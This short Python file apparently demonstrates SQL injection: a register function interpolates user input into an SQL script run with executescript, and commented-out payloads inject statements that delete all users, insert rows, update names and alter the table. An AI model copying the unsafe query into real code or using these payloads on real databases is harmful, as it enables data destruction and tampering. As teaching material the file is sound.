import sqlite3

def register(username: str, password: str) -> None:
    with sqlite3.connect('hw.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()

def hack(username, password) -> None:
    register(username, password)

#hack("hggfjh', 'other_password'); --", "real_password")
#hack("hello', 'other_password'); DELETE FROM table_users; --", "real_password")
'''hack("hello', 'other_password'); INSERT INTO table_users "
     "VALUES ('hello', 'you'),"
     "('hi', 'there'),"
     "('how is', 'life'),"
     "('hacked', 'you haha') ; --", "real_password")'''
#hack("hello', ''); UPDATE table_users SET username = 'new_user' WHERE username = 'funny'; --", "real_password")
#hack("hello', ''); ALTER TABLE table_users ADD COLUMN my_column text; --", "real_password")
